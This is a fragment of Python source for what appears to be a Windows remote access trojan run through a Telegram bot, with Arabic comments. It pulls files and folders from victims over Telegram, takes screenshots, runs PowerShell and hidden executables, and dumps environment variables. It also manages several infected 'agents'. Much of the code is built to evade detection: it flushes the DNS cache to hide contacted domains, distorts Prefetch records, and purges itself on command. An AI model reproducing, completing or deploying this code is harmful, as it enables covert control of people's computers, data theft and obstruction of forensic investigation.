        elif c == "rmdir" and a: shutil.rmtree(safe_path(a[0]), ignore_errors=True)
        elif c == "hostname":
            print(socket.gethostname())
        elif c == "public-ip":
            try:
                ip = requests.get("https://api.ipify.org").text
                print(ip)
            except Exception as e:
                print(f"Failed to get public IP: {e}")
        elif c == "arch":
            print(platform.architecture()[0])
        elif c == "tree":
            def print_tree(path, prefix=""):
                path = Path(path)
                print(prefix + path.name)
                if path.is_dir():
                    for p in path.iterdir():
                        print_tree(p, prefix + "    ")
            print_tree(CURRENT_DIR)
        elif c == "copy" and len(a) == 2:
            s, d = safe_path(a[0]), safe_path(a[1])
            shutil.copytree(s, d) if s.is_dir() else shutil.copy(s, d)
        elif c.lower() == "restart":
            if restart_system(): print("[+] System restarting silently")
        elif c.lower() in ["shutdown", "poweroff"]:
            if shutdown_system(): print("[+] System shutting down silently")
        elif c.lower() == "nosleep":
            if enable_nosleep(): print("[+] NoSleep enabled silently")
        elif c == "move" and len(a) == 2: shutil.move(safe_path(a[0]), safe_path(a[1]))
        elif c == "rename" and len(a) == 2: safe_path(a[0]).rename(safe_path(a[1]))
        elif c == "size" and a: print(safe_path(a[0]).stat().st_size, "bytes")
        elif c == "find" and a:
            for p in CURRENT_DIR.rglob(a[0]): print(p)
        elif c == "cat" and a: print(safe_path(a[0]).read_text(errors="ignore"))
        elif c == "preview" and len(a) == 2:
            lines = safe_path(a[0]).read_text(errors="ignore").splitlines()
            print("\n".join(lines[:int(a[1])]))
        elif c == "hash" and a: print(sha256(safe_path(a[0])))
        elif c == "whoami": print(getpass.getuser())
        elif c == "uname": print(platform.platform())
        elif c == "uptime": print(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
        elif c == "selfdelete":
            print("[!] Critical: Initiating Universal Entropy Protocol...")
            print("[*] Deconstructing structural artifacts and clearing traces.")
            # استدعاء دالة التدمير الشامل التي عرفناها سابقاً
            initiate_final_purge()
        elif c == "run" and a:
            target = safe_path(a[0])

            if not target.exists():
                print(f"[!] File not found: {target}")
            else:
                try:
                    CREATE_NO_WINDOW = 0x08000000
                    extra_args = a[1:] if len(a) > 1 else []

                    if target.suffix.lower() == ".py":
                        # استخدم pywin.exe لتشغيل الملف
                        python_exec = r"C:\ProgramData\WinCore\pywin.exe"
                        cmd = [python_exec, str(target), *extra_args]

                    elif target.suffix.lower() == ".exe":
                        cmd = [str(target), *extra_args]

                    else:
                        print("[!] Unsupported file type")
                        return

                    proc = subprocess.Popen(
                        cmd,
                        cwd=str(target.parent),
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL,
                        creationflags=CREATE_NO_WINDOW
                    )

                    print(f"[+] Started successfully")
                    print(f"[+] PID: {proc.pid}")

                except Exception as e:
                    print(f"[!] Failed to run: {e}")
        elif c == "ip":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            print(s.getsockname()[0])
            s.close()
        elif c == "env":
            for k, v in os.environ.items(): print(f"{k}={v}")
        elif c == "process" and a:
            if a[0] == "list":
                for p in psutil.process_iter(['pid', 'name']): print(p.info)
            elif a[0] == "kill" and len(a) == 2: psutil.Process(int(a[1])).kill()
        else:
            print("❌ Unknown command")

        ###############################################################################################
        # DNS Resolution Artifact Suppression — Cache & Query Trace Reduction
        import ctypes

        def flush_dns_cache_advanced():
            """
            تطهير سجلات حل الأسماء (DNS Cache) لكسر الارتباط الزمني (Temporal Decorrelation).
            تستخدم لمنع المحلل من ربط نشاط البرمجية بنطاقات خارجية.
            """
            try:
                # الطريقة الاحترافية: استدعاء الدالة مباشرة من مكتبة Dnsapi
                # DnsFlushResolverCache هي الدالة المسؤولة عن ipconfig /flushdns داخلياً
                dnsapi = ctypes.windll.dnsapi
                result = dnsapi.DnsFlushResolverCache()
                
                if result == 1: # القيمة 1 تدل على النجاح في نظام ويندوز
                    return True
                
                # خيار احتياطي صامت جداً عبر subprocess في حال فشل DLL
                subprocess.run(
                    ["ipconfig", "/flushdns"], 
                    capture_output=True, 
                    creationflags=0x08000000 # مخفي تماماً
                )
                return True
            except Exception:
                return False
        flush_dns_cache_advanced()

    except Exception as e:
        
        print("Error:", e)
    finally:
        flush_dns_cache_advanced()
        sys.stdout = original_stdout

    return out.getvalue()

# =========================
# TELEGRAM HANDLER (الإصلاح الجذري هنا)
# =========================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ACTIVE_AGENT_ID, LAST_SEEN
    
    if not update.message or update.effective_chat.id != AUTHORIZED_CHAT_ID:
        return
    
    LAST_SEEN = time.time()
    if AGENT_ID in AGENTS:
        AGENTS[AGENT_ID]["last_seen"] = LAST_SEEN

    # ---------- RECEIVE FILE ----------
    if update.message.document:
        doc = update.message.document
        file = await doc.get_file()
        path = CURRENT_DIR / doc.file_name
        await file.download_to_drive(path)
        await update.message.reply_text(f"📥 Uploaded → {path}")
        return

    if not update.message.text:
        return

    text = update.message.text.strip().lstrip("/")
    
    # ---------- EXIT BOT ----------
    if text.lower() == "exit":
        await update.message.reply_text("🛑 Bot shutting down...")
        await context.application.stop()
        await context.application.shutdown()
        os._exit(0)

    #------------- USE -------------
    if text.startswith("use "):
        target_id = text.split(maxsplit=1)[1].strip()
        if target_id not in AGENTS:
            await update.message.reply_text("❌ Agent not found")
            return
        ACTIVE_AGENT_ID = target_id
        await update.message.reply_text(f"🎯 Active agent set → {target_id}")
        return

    if text.lower() == "session -k":
        ACTIVE_AGENT_ID = None
        await update.message.reply_text("🔓 Agent session released")
        return

    # الحارس: إذا كان هناك عميل محدد وهذا ليس هو، نتوقف هنا
    if ACTIVE_AGENT_ID is not None and ACTIVE_AGENT_ID != AGENT_ID:
        return

    # وظيفة مساعدة لتشغيل المهام في الخلفية
    loop = asyncio.get_event_loop()

    # ---------- GET FILE ----------
    if text.startswith("get "):
        args = text.split()[1:]
        p = safe_path(args[0])
        if p.exists() and p.is_file():
            await update.message.reply_document(p.open("rb"))
        else:
            await update.message.reply_text("❌ File not found")
        return

    # ---------- GET DIR ----------
    if text.startswith("getdir "):
        args = text.split()[1:]
        d = safe_path(args[0])
        if d.exists() and d.is_dir():
            zip_name = CURRENT_DIR / f"{d.name}.zip"
            await loop.run_in_executor(executor, zip_folder, d, zip_name)
            await update.message.reply_document(zip_name.open("rb"))
            zip_name.unlink()
            gc.collect()
        else:
            await update.message.reply_text("❌ Directory not found")
        return
    
    # ---------- AGENTS ----------
    if text.lower() == "sessions -i":
        if not AGENTS:
            await update.message.reply_text("ℹ No agents online")
            return
        lines = []
        for aid, info in AGENTS.items():
            status = "🟢" if aid == ACTIVE_AGENT_ID else "⚪"
            last = datetime.fromtimestamp(info["last_seen"]).strftime("%Y-%m-%d %H:%M:%S")
            lines.append(f"{status} ID: {aid}\n   Host: {info['host']}\n   User: {info['user']}\n   OS: {info['os']}\n   Last Seen: {last}")
        await update.message.reply_text("\n\n".join(lines))
        return

    # ---------- SCREENSHOT (BACKGROUND) ----------
    # داخل دالة handle_message(update, context):
    
    # داخل handle_message(update, context):
    
    if text.lower() == "network":
        if platform.system() != "Windows":
            await update.message.reply_text("❌ هذا الأمر مصمم للعمل على أنظمة Windows فقط.")
            return

        await update.message.reply_text("📡 جاري فحص الشبكة بالكامل في الذاكرة... انتظر قليلاً.")
        
        def start_radar():
            radar = WindowsNetworkRadar()
            return radar.run_discovery()

        # تنفيذ الرادار في الخلفية
        final_report = await loop.run_in_executor(executor, start_radar)

        # تحويل النص إلى ملف "وهمي" في الذاكرة لإرساله دون حفظه على القرص
        bio = io.BytesIO(final_report.encode('utf-8'))
        bio.name = "Network_Scan_Result.txt"
        
        await update.message.reply_document(document=bio, caption="✅ نتائج فحص الشبكة (تمت في الذاكرة)")
        
        # تنظيف الذاكرة
        del final_report
        bio.close()
        gc.collect()
        return
    
    if text.lower() == "screenshot":
        await update.message.reply_text("📸 Capturing... please wait.")
        
        # نرسل الأمر للوكيل
        await loop.run_in_executor(executor, execute_command, "screenshot")
        
        # ننتظر قليلاً ليتولد الملف ثم نرسله
        ss_path = r"C:\ProgramData\WinExec\ss.png"
        
        # محاولة فحص وجود الملف لمدة 5 ثواني
        for _ in range(10): 
            if os.path.exists(ss_path):
                with open(ss_path, "rb") as photo:
                    await update.message.reply_photo(photo=photo, caption="🎯 Captured by Agent")
                os.remove(ss_path) # نحذفها بعد الإرسال للنظافة
                return
            time.sleep(0.5)
        
        await update.message.reply_text("❌ Failed to retrieve screenshot from agent.")
        return

    # ---------- POWERSHELL SESSION ----------
    if text.lower().startswith("ps"):
        args = text.split()[1:]
        if args:
            sub_cmd = args[0].lower()
            if sub_cmd == "on":
                await update.message.reply_text(powershell_on())
            elif sub_cmd == "off":
                await update.message.reply_text(powershell_off())
            else:
                ps_command = " ".join(args)
                # تشغيل PowerShell في خيط منفصل لمنع التجميد
                output = await loop.run_in_executor(executor, powershell_exec, ps_command)
                await update.message.reply_text(output[:4000] or "✔ Done")
                del output
                gc.collect()
        else:
            await update.message.reply_text("Usage: ps <on|off|command>")
        return

    # ---------- RUN ANY COMMAND (NON-BLOCKING) ----------
    # تشغيل execute_command في خيط منفصل لضمان عدم تشنج البوت
    result = await loop.run_in_executor(executor, execute_command, text)
    if result.strip():
        await update.message.reply_text(result[:4000])
        del result        # حذف الناتج من الذاكرة فور الإرسال
        gc.collect()      # تنظيف الذاكرة مباشرة

    elif not ACTIVE_AGENT_ID or ACTIVE_AGENT_ID == AGENT_ID:
        # إذا لم يكن هناك نتيجة ولكن الأمر موجه لنا
        pass

# =========================
# MAIN
# =========================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.ALL, handle_message))

    async def post_init(app):
        await notify_startup(app)

    app.post_init = post_init
    app.run_polling()
    
    # 3. تشويه سجل الـ Prefetch الخاص بالمشغل الرئيسي pywin.exe
    distort_execution_history("pywin.exe")
    
    # 4. تأمين البنية التحتية والمجلدات
    secure_agent_infrastructure()

if __name__ == "__main__":
    main()